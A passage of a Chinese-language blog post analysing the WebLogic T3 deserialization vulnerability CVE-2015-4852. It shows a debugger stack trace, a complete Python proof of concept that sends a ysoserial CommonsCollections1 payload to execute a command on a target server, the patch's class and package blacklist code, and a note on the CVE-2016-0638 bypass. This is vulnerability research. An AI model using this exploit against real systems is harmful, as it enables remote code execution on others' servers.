(weblogic.rjvm)</span><br><span class="line">read:<span class="number">38</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">readMsgAbbrevs:<span class="number">283</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">init:<span class="number">213</span>, MsgAbbrevInputStream (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">498</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">330</span>, MuxableSocketT3 (weblogic.rjvm.t3)</span><br><span class="line">dispatch:<span class="number">387</span>, BaseAbstractMuxableSocket (weblogic.socket)</span><br><span class="line">readReadySocketOnce:<span class="number">967</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">readReadySocket:<span class="number">899</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">processSockets:<span class="number">130</span>, PosixSocketMuxer (weblogic.socket)</span><br><span class="line">run:<span class="number">29</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">42</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">145</span>, ExecuteThread (weblogic.kernel)</span><br><span class="line">run:<span class="number">117</span>, ExecuteThread (weblogic.kernel)</span><br></pre></td></tr></table></figure>

<p>信息 9</p>
<p>此时<code>ChainedTransformer</code>对应为：</p>
<p>![image-20200201151125047](/Users/panicall/Library/Application Support/typora-user-images/image-20200201151125047.png)</p>
<p>信息 10</p>
<p>利用Java反射机制执行了<code>touch /tmp/exp</code>。</p>
<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>PoC见<code>参考2</code>,这里贴出来：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(host, port)</span>:</span></span><br><span class="line"></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.settimeout(<span class="number">10</span>)</span><br><span class="line">    server_address = (host, int(port))</span><br><span class="line">    data = <span class="string">""</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sock.connect(server_address)</span><br><span class="line">        <span class="comment"># Send headers	</span></span><br><span class="line">        <span class="comment">#headers = 't3 12.2.1nAS:255nHL:19nn'.format(port)</span></span><br><span class="line">        <span class="comment">#headers = bytes(headers, encoding = "utf8")</span></span><br><span class="line">        <span class="comment">#sock.sendall(headers)</span></span><br><span class="line">        <span class="comment">#time.sleep(1)</span></span><br><span class="line">        <span class="comment">#data = sock.recv(1024)</span></span><br><span class="line"></span><br><span class="line">        xx = bytes.fromhex(<span class="string">'74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'</span>)</span><br><span class="line">        sock.send(xx)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        sock.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># java -jar ysoserial.jar CommonsCollections1 "touch /tmp/exp" &gt; ./tmp</span></span><br><span class="line">        f = open(<span class="string">'./tmp'</span>, <span class="string">'rb'</span>)</span><br><span class="line">        payload_obj = f.read()</span><br><span class="line">        f.close()</span><br><span class="line">        payload1 = <span class="string">"000005ba016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000"</span></span><br><span class="line">        payload3 = <span class="string">"aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870774b210000000000000000000d31302e3130312e3137302e3330000d31302e3130312e3137302e33300f0371a20000000700001b59ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870771d01a621b7319cc536a1000a3137322e31392e302e32f7621bb50000000078"</span></span><br><span class="line">        payload1=bytes.fromhex(payload1)</span><br><span class="line">        payload3 = bytes.fromhex(payload3)</span><br><span class="line">        payload2 = payload_obj</span><br><span class="line">        payload = payload1 + payload2 + payload3</span><br><span class="line"></span><br><span class="line">        payload = struct.pack(<span class="string">'&gt;I'</span>, len(payload)) + payload[<span class="number">4</span>:]</span><br><span class="line"></span><br><span class="line">        sock.send(payload)</span><br><span class="line">        data = sock.recv(<span class="number">4096</span>)</span><br><span class="line">    <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">u'socket 连接异常！'</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        sock.close()</span><br><span class="line"></span><br><span class="line">exp(<span class="string">'172.16.100.97'</span>, <span class="number">7001</span>)</span><br></pre></td></tr></table></figure>

<p>信息 11</p>
<p>PoC中的利用链主要使用<code>参考3</code>中的ysoserial生成。</p>
<p>注意PoC中T3握手的代码有更改。</p>
<h2 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h2><p><code>参考 5</code>中有介绍本次补丁在如下三个地方有更新：</p>
<blockquote>
<p>weblogic.rjvm.InboundMsgAbbrev.class :: ServerChannelInputStream</p>
<p>weblogic.rjvm.MsgAbbrevInputStream.class  </p>
<p>weblogic.iiop.Utils.class</p>
</blockquote>
<p><code>参考 4</code>中也有比较详细的介绍。</p>
<p>本小节基于参考信息做个整理。</p>
<p>以<code>weblogic.rjvm.InboundMsgAbbrev.class::ServerChannelInputStream</code>为例，其实<code>weblogic.rjvm.MsgAbbrevInputStream.class</code>也是一样，都是多了<code>checkLegacyBlacklistIfNeeded</code>的检查。</p>
<p><code>weblogic/rjvm/InboundMsgAbbrev.class</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Class <span class="title">resolveClass</span><span class="params">(ObjectStreamClass descriptor)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.checkLegacyBlacklistIfNeeded(descriptor.getName());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvalidClassException var4) &#123;</span><br><span class="line">                <span class="keyword">throw</span> var4;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Class c = <span class="keyword">super</span>.resolveClass(descriptor);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(<span class="string">"super.resolveClass returns null."</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ObjectStreamClass localDesc = ObjectStreamClass.lookup(c);</span><br><span class="line">                <span class="keyword">if</span> (localDesc != <span class="keyword">null</span> &amp;&amp; localDesc.getSerialVersionUID() != descriptor.getSerialVersionUID()) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(<span class="string">"different serialVersionUID. local: "</span> + localDesc.getSerialVersionUID() + <span class="string">" remote: "</span> + descriptor.getSerialVersionUID());</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> c;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> Class&lt;?&gt; resolveProxyClass(String[] interfaces) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">            String[] var2 = interfaces;</span><br><span class="line">            <span class="keyword">int</span> var3 = interfaces.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> var4 = <span class="number">0</span>; var4 &lt; var3; ++var4) &#123;</span><br><span class="line">                String intf = var2[var4];</span><br><span class="line">                <span class="keyword">if</span> (intf.equals(<span class="string">"java.rmi.registry.Registry"</span>)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Unauthorized proxy deserialization"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.resolveProxyClass(interfaces);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>信息 11</p>
<p>checkLegacyBlacklistIfNeeded`代码如下：</p>
<p>weblogic/utils/io/FilteringObjectInputStream.class`</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">checkLegacyBlacklistIfNeeded</span><span class="params">(String className)</span> <span class="keyword">throws</span> InvalidClassException </span>&#123;</span><br><span class="line">    WebLogicObjectInputFilter.checkLegacyBlacklistIfNeeded(className);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>信息 12</p>
<p>weblogic/rjvm/InboundMsgAbbrev.class</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkLegacyBlacklistIfNeeded</span><span class="params">(String className)</span> <span class="keyword">throws</span> InvalidClassException </span>&#123;</span><br><span class="line">    checkInitialized();</span><br><span class="line">    <span class="keyword">if</span> (!isJreFilteringAvailable) &#123;</span><br><span class="line">        <span class="keyword">if</span> (isBlacklistedLegacy(className)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(className, <span class="string">"Unauthorized deserialization attempt"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>信息 13</p>
<p>注意这里只有在JRE自带的过滤器不可用的情况下，才会执行<code>isBlacklistedLegacy</code>。</p>
<p><code>weblogic/utils/io/oif/WebLogicObjectInputFilter.class</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isBlacklistedLegacy</span><span class="params">(String className)</span> </span>&#123;</span><br><span class="line">    String normalizedName = normalizeClassName(className);</span><br><span class="line">    <span class="keyword">if</span> (LEGACY_BLACKLIST != <span class="keyword">null</span> &amp;&amp; normalizedName != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (LEGACY_BLACKLIST.contains(normalizedName)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String pkgName = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                pkgName = normalizedName.substring(<span class="number">0</span>, normalizedName.lastIndexOf(<span class="number">46</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var4) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> pkgName != <span class="keyword">null</span> &amp;&amp; !pkgName.isEmpty() &amp;&amp; LEGACY_BLACKLIST.contains(pkgName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>信息 14</p>
<p>这个函数会使用LEGACY_BLACKLIST来检查包名和类名。而<code>LEGACY_BLACKLIST</code>的赋值来自于：</p>
<ul>
<li>DEFAULT_BLACKLIST_CLASSES</li>
<li>DEFAULT_BLACKLIST_PACKAGES</li>
<li>blacklist</li>
</ul>
<p><code>weblogic/utils/io/oif/WebLogicFilterConfig.class</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">constructLegacyBlacklist</span><span class="params">(String blacklist, <span class="keyword">boolean</span> isBlacklistDisabled, <span class="keyword">boolean</span> isDefaultBlacklistDisabled)</span> </span>&#123;</span><br><span class="line">        Set&lt;String&gt; blacklistSet = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (!isBlacklistDisabled) &#123;</span><br><span class="line">            blacklistSet = <span class="keyword">new</span> HashSet(<span class="number">32</span>);</span><br><span class="line">            <span class="keyword">if</span> (!isDefaultBlacklistDisabled) &#123;</span><br><span class="line">                String[] var5 = DEFAULT_BLACKLIST_CLASSES;</span><br><span class="line">                <span class="keyword">int</span> var6 = var5.length;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">int</span> var7;</span><br><span class="line">                String s;</span><br><span class="line">                <span class="keyword">for</span>(var7 = <span class="number">0</span>; var7 &lt; var6; ++var7) &#123;</span><br><span class="line">                    s = var5[var7];</span><br><span class="line">                    blacklistSet.add(s);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var5 = DEFAULT_BLACKLIST_PACKAGES;</span><br><span class="line">                var6 = var5.length;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(var7 = <span class="number">0</span>; var7 &lt; var6; ++var7) &#123;</span><br><span class="line">                    s = var5[var7];</span><br><span class="line">                    blacklistSet.add(s);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (blacklist != <span class="keyword">null</span>) &#123;</span><br><span class="line">                StringTokenizer st = <span class="keyword">new</span> StringTokenizer(blacklist, <span class="string">","</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(st.hasMoreTokens()) &#123;</span><br><span class="line">                    String token = st.nextToken();</span><br><span class="line">                    <span class="keyword">if</span> (token.startsWith(<span class="string">"+"</span>)) &#123;</span><br><span class="line">                        blacklistSet.add(token.substring(<span class="number">1</span>));</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (token.startsWith(<span class="string">"-"</span>)) &#123;</span><br><span class="line">                        blacklistSet.remove(token.substring(<span class="number">1</span>));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        blacklistSet.add(token);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (blacklistSet.isEmpty()) &#123;</span><br><span class="line">                blacklistSet = <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.BLACKLIST = blacklistSet;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>信息 15</p>
<p><code>blacklist</code>内容来自于<code>weblogic.rmi.blacklist</code>；前两个来源则比较固定：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_BLACKLIST_PACKAGES = <span class="keyword">new</span> String[]&#123;<span class="string">"org.apache.commons.collections.functors"</span>, <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax"</span>, <span class="string">"javassist"</span>, <span class="string">"java.rmi.activation"</span>, <span class="string">"sun.rmi.server"</span>, <span class="string">"org.jboss.interceptor.builder"</span>, <span class="string">"org.jboss.interceptor.reader"</span>, <span class="string">"org.jboss.interceptor.proxy"</span>, <span class="string">"org.jboss.interceptor.spi.metadata"</span>, <span class="string">"org.jboss.interceptor.spi.model"</span>, <span class="string">"com.bea.core.repackaged.springframework.aop.aspectj"</span>, <span class="string">"com.bea.core.repackaged.springframework.aop.aspectj.annotation"</span>, <span class="string">"com.bea.core.repackaged.springframework.aop.aspectj.autoproxy"</span>, <span class="string">"com.bea.core.repackaged.springframework.beans.factory.support"</span>, <span class="string">"org.python.core"</span>&#125;;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_BLACKLIST_CLASSES = <span class="keyword">new</span> String[]&#123;<span class="string">"org.codehaus.groovy.runtime.ConvertedClosure"</span>, <span class="string">"org.codehaus.groovy.runtime.ConversionHandler"</span>, <span class="string">"org.codehaus.groovy.runtime.MethodClosure"</span>, <span class="string">"org.springframework.transaction.support.AbstractPlatformTransactionManager"</span>, <span class="string">"java.rmi.server.UnicastRemoteObject"</span>, <span class="string">"java.rmi.server.RemoteObjectInvocationHandler"</span>, <span class="string">"com.bea.core.repackaged.springframework.transaction.support.AbstractPlatformTransactionManager"</span>, <span class="string">"java.rmi.server.RemoteObject"</span>&#125;;</span><br></pre></td></tr></table></figure>

<p>信息 16</p>
<p>以上就是blacklist的内容，而JRE自带的部分本文暂未介绍（应该是在后面的漏洞中添加的机制），可以见<code>参考 4</code>。</p>
<p>对于本文所用PoC，在反序列化的时候，<code>weblogic.rjvm.InboundMsgAbbrev.class::ServerChannelInputStream</code>中的<code>resolveClass</code>函数会将PoC中使用的<code>org.apache.commons.collections.functors</code>包判断为黑。</p>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>后来又出现了<code>CVE-2016-0638</code>，这里不多讲，这个CVE其实就是找到了一个新的反序列化点，在<code>weblogic.jms.common.StreamMessageImpl</code>里的 <code>readExternal()</code>,<code>readExternal()</code>有新的<code>ObjectInputStream</code>和<code>readObject</code>，把原来的InputStream里面的下一个chunk作为反序列化数据处理了，关键是这里的<code>ObjectInputStream</code>未添加黑名单匹配，相当于是二次反序列化了。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2>
  </div>
</article>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/posts/">Writing</a></li>
         
          <li><a href="http://github.com/sergodeeva" target="_blank" rel="noopener">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Weblogic-T3反序列化开篇：CVE-2015-4852"><span class="toc-number">1.</span> <span class="toc-text">Weblogic T3反序列化开篇：CVE-2015-4852</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞描述"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#入口反序列化点"><span class="toc-number">1.2.1.</span> <span class="toc-text">入口反序列化点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用链"><span class="toc-number">1.2.2.</span> <span class="toc-text">利用链</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞调试"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PoC"><span class="toc-number">1.4.</span> <span class="toc-text">PoC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#补丁"><span class="toc-number">1.5.</span> <span class="toc-text">补丁</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过"><span class="toc-number">1.6.</span> <span class="toc-text">绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">1.7.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%80%E7%AF%87%EF%BC%9A%20CVE-2015-4852/" target="_blank" rel="noopener"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%80%E7%AF%87%EF%BC%9A%20CVE-2015-4852/&text=weblogic/Weblogic T3反序列化开篇： CVE-2015-4852" target="_blank" rel="noopener"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%80%E7%AF%87%EF%BC%9A%20CVE-2015-4852/&title=weblogic/Weblogic T3反序列化开篇： CVE-2015-4852" target="_blank" rel="noopener"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%80%E7%AF%87%EF%BC%9A%20CVE-2015-4852/&is_video=false&description=weblogic/Weblogic T3反序列化开篇： CVE-2015-4852" target="_blank" rel="noopener"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=weblogic/Weblogic T3反序列化开篇： CVE-2015-4852&body=Check out this article: http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%80%E7%AF%87%EF%BC%9A%20CVE-2015-4852/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%80%E7%AF%87%EF%BC%9A%20CVE-2015-4852/&title=weblogic/Weblogic T3反序列化开篇： CVE-2015-4852" target="_blank" rel="noopener"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%80%E7%AF%87%EF%BC%9A%20CVE-2015-4852/&title=weblogic/Weblogic T3反序列化开篇： CVE-2015-4852" target="_blank" rel="noopener"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%80%E7%AF%87%EF%BC%9A%20CVE-2015-4852/&title=weblogic/Weblogic T3反序列化开篇： CVE-2015-4852" target="_blank" rel="noopener"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%80%E7%AF%87%EF%BC%9A%20CVE-2015-4852/&title=weblogic/Weblogic T3反序列化开篇： CVE-2015-4852" target="_blank" rel="noopener"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%80%E7%AF%87%EF%BC%9A%20CVE-2015-4852/&name=weblogic/Weblogic T3反序列化开篇： CVE-2015-4852&description=" target="_blank" rel="noopener"><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
      <ul>
        <li id="toc"><a class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
        <li id="share"><a class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
